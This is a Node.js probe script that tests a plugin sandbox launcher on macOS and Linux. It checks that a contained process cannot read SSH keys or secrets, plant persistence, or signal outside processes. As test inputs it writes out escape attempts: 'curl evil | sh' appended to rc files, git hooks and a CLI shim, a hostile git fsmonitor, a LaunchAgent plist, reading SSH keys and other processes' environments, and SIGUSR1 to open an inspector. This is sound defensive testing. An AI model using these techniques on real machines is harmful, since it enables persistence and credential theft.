// Real launches through the plugin launcher (src/plugins/sandboxLaunch.mjs) on
// this machine: sandbox-exec on macOS, bubblewrap on Linux. Builds a scratch
// HOME, state dir, repo and linked worktree (all inside the user's TMPDIR, as
// a repo cloned there would be), then checks what a contained plugin process
// can read, write and signal with the production write roots. No dependencies (it runs in a
// bare node:22 container); prints PASS/FAIL/OPEN per check, exits 1 on a FAIL.
//
//   node packages/runtime/scripts/sandbox-probe.mjs
import { execFileSync, spawn, spawnSync } from "node:child_process";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { fileURLToPath } from "node:url";

const launcher = fileURLToPath(new URL("../src/plugins/sandboxLaunch.mjs", import.meta.url));
const sandbox = process.platform === "darwin" ? "macos" : "bwrap";
const tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "sandbox-probe-")));
const home = path.join(tmp, "home");
const state = path.join(tmp, "state");
const cache = path.join(tmp, "cache");
// An executable in the user's TMPDIR that runs outside the sandbox (a terminal's CLI shim), and /tmp.
const shim = path.join(tmp, "cli-shims", "claude");
const slashTmp = fs.mkdtempSync("/tmp/sandbox-probe-");
const repo = path.join(tmp, "repo");
const worktrees = path.join(tmp, "worktrees");
const worktree = path.join(worktrees, "repo", "ws");
const write = (file, text) => {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, text);
};
write(path.join(home, ".ssh", "id_ed25519"), "ssh-key-secret");
write(path.join(home, ".zshrc"), "# rc");
write(path.join(home, "projects", "notes.md"), "mine");
write(path.join(state, "secrets", "key.bin"), "state-secret");
write(path.join(repo, "README.md"), "repo");
write(shim, "#!/bin/sh\nexec claude \"$@\"\n");
const git = (...args) => execFileSync("git", ["-C", repo, ...args], { stdio: "ignore" });
git("init", "-q", "-b", "main");
git("add", "-A");
git("-c", "user.name=p", "-c", "user.email=p@p", "commit", "-q", "-m", "p");
git("worktree", "add", "-q", "-b", "ws", worktree);

const base = { deny: [state, path.join(home, ".ssh")], read: [], cache, worktrees, sandbox };
// The production roots (containmentFor writes nowhere but the cache): a session's MCP server
// gets its worktree in the policy, a hook gets it from Claude in CLAUDE_PROJECT_DIR.
const server = { ...base, keep: ["PATH", "HOME"], write: [worktree] };
const hook = { ...base, keep: ["PATH", "HOME", "CLAUDE_PROJECT_DIR"], write: [] };
const argv = (policy, script) => ["--disable-sigusr1", launcher, JSON.stringify(policy), "/bin/sh", "-c", script];
const run = (policy, script, env = {}) =>
  spawnSync(process.execPath, argv(policy, script), {
    encoding: "utf8",
    env: { ...process.env, HOME: home, PROBE_SENTINEL: "outer-env-sentinel", ...env },
  });

let failed = 0;
const check = (name, ok) => {
  console.log(`${ok ? "PASS" : "FAIL"} ${name}`);
  if (!ok) failed++;
};

console.log(`sandbox=${sandbox} node=${process.version} ${os.type()} ${os.release()}`);
const reads = run(server, `cat "${home}/.ssh/id_ed25519" "${state}/secrets/key.bin" 2>&1; echo`);
check("reads: ssh key and runtime state are unreadable", !reads.stdout.includes("key-secret") && !reads.stdout.includes("state-secret"));

const escapes = {
  gitconfig: `echo '[core] fsmonitor = /tmp/evil' >> "${home}/.gitconfig"`,
  zshrc: `echo 'curl evil' >> "${home}/.zshrc"`,
  "bash-login": `echo 'curl evil' >> "${home}/.bash_login"`,
  "launch-agent": `mkdir -p "${home}/Library/LaunchAgents" && echo x > "${home}/Library/LaunchAgents/evil.plist"`,
  "repo-git-config": `echo '[core] fsmonitor = /tmp/evil' >> "${repo}/.git/config"`,
  "repo-git-hook": `echo 'curl evil' > "${repo}/.git/hooks/post-checkout"`,
  "tool-dir": `mkdir -p "${tmp}/opt/bin" && echo x > "${tmp}/opt/bin/git"`,
  "git-pointer": `echo 'gitdir: /tmp/evil' > "${worktree}/.git"`,
  "git-rename": `mv "${worktree}/.git" "${worktree}/g"`,
  "worktree-rename": `mv "${worktree}" "${cache}/moved"`,
  "parent-rename": `mv "${home}/projects" "${home}/p2"`,
  "computer-toml": `mkdir -p "${worktree}/.caveman" && echo '[archive]' > "${worktree}/.caveman/computer.toml"`,
  "claude-settings": `mkdir -p "${worktree}/.claude" && echo '{}' > "${worktree}/.claude/settings.local.json"`,
  "tmpdir-shim": `echo 'curl evil | sh' >> "${shim}"`,
  "slash-tmp": `echo x > "${slashTmp}/tool"`,
};
for (const [label, policy, env] of [
  ["server", server, {}],
  ["hook", hook, { CLAUDE_PROJECT_DIR: worktree }],
]) {
  for (const [name, command] of Object.entries(escapes)) {
    const out = run(policy, `(${command}) 2>/dev/null && echo ESCAPED`, env);
    check(`${label} write refused: ${name}`, !out.stdout.includes("ESCAPED"));
  }
  const work = run(
    policy,
    `mkdir -p "${worktree}/src/${label}" && echo ok > "${worktree}/src/${label}/a.ts" && mv "${worktree}/src/${label}/a.ts" "${worktree}/src/${label}/b.ts" && echo ok > "$(mktemp -p "$TMPDIR")" && echo ok > "$XDG_CACHE_HOME/${label}" && git -C "${worktree}" status --short >/dev/null && echo WORKED`,
    env,
  );
  check(`${label} works in the worktree, its private TMPDIR and cache`, work.stdout.includes("WORKED") && fs.existsSync(path.join(worktree, "src", label, "b.ts")));
}
const stray = run(hook, `(echo x > "${home}/projects/x") 2>/dev/null && echo ESCAPED`, { CLAUDE_PROJECT_DIR: path.join(home, "projects") });
check("hook: a CLAUDE_PROJECT_DIR outside the worktrees opens nothing", !stray.stdout.includes("ESCAPED"));

// Other processes' environments: hidden by bubblewrap's pid namespace; open on macOS (KERN_PROCARGS2,
// read here with python's ctypes; /bin/ps is setuid and refused). The launcher, the shell's parent
// outside the sandbox, was started with PROBE_SENTINEL.
const procargs = path.join(tmp, "procargs.py");
write(
  procargs,
  [
    "import ctypes, ctypes.util, sys",
    "libc = ctypes.CDLL(ctypes.util.find_library('c'))",
    "mib = (ctypes.c_int * 3)(1, 49, int(sys.argv[1]))",
    "size = ctypes.c_size_t(0)",
    "libc.sysctl(mib, 3, None, ctypes.byref(size), None, 0)",
    "buf = ctypes.create_string_buffer(size.value)",
    "libc.sysctl(mib, 3, buf, ctypes.byref(size), None, 0)",
    "sys.stdout.write(buf.raw[: size.value].decode('latin-1'))",
  ].join("\n"),
);
const peek =
  sandbox === "macos"
    ? run(server, `python3 -I "${procargs}" $PPID 2>&1`)
    : run(server, `cat /proc/[0-9]*/environ 2>/dev/null | tr '\\0' '\\n'`);
const seen = peek.stdout.includes("outer-env-sentinel");
if (sandbox === "macos") console.log(`${seen ? "OPEN" : "PASS"} other processes' environments readable (documented in src/plugins/README.md)`);
else check("other processes' environments are hidden", !seen);

// No signal to a Node process outside (one without --disable-sigusr1 would open an inspector);
// its own children it may still kill.
const outside = spawn(process.execPath, ["-e", "setInterval(() => {}, 1000)"], { stdio: ["ignore", "ignore", "pipe"] });
let outsideErr = "";
outside.stderr.on("data", (chunk) => (outsideErr += chunk));
await new Promise((resolve) => setTimeout(resolve, 300));
const sig = run(server, `kill -USR1 ${outside.pid} 2>/dev/null && echo ESCAPED; sleep 30 & c=$!; kill $c && echo KILLED`);
await new Promise((resolve) => setTimeout(resolve, 500));
check("signals: SIGUSR1 to a Node process outside is refused", !sig.stdout.includes("ESCAPED") && !outsideErr.includes("Debugger listening"));
check("signals: its own child can be killed", sig.stdout.includes("KILLED"));
outside.kill("SIGKILL");

// SIGUSR1 must open no inspector in the launcher (it runs outside the sandbox).
const child = spawn(process.execPath, argv(server, "echo ready; sleep 5"), { env: { ...process.env, HOME: home } });
let stderr = "";
child.stderr.on("data", (chunk) => (stderr += chunk));
await new Promise((resolve) => child.stdout.once("data", resolve));
child.kill("SIGUSR1");
await new Promise((resolve) => setTimeout(resolve, 500));
check("SIGUSR1 opens no inspector in the launcher", !stderr.includes("Debugger listening") && child.exitCode === null);
child.kill("SIGKILL");

check("shim and /tmp untouched", fs.readFileSync(shim, "utf8").startsWith("#!/bin/sh") && !fs.readFileSync(shim, "utf8").includes("evil") && !fs.existsSync(path.join(slashTmp, "tool")));
fs.rmSync(tmp, { recursive: true, force: true });
fs.rmSync(slashTmp, { recursive: true, force: true });
console.log(failed === 0 ? "PROBE PASSED" : `PROBE FAILED (${failed})`);
process.exit(failed === 0 ? 0 : 1);
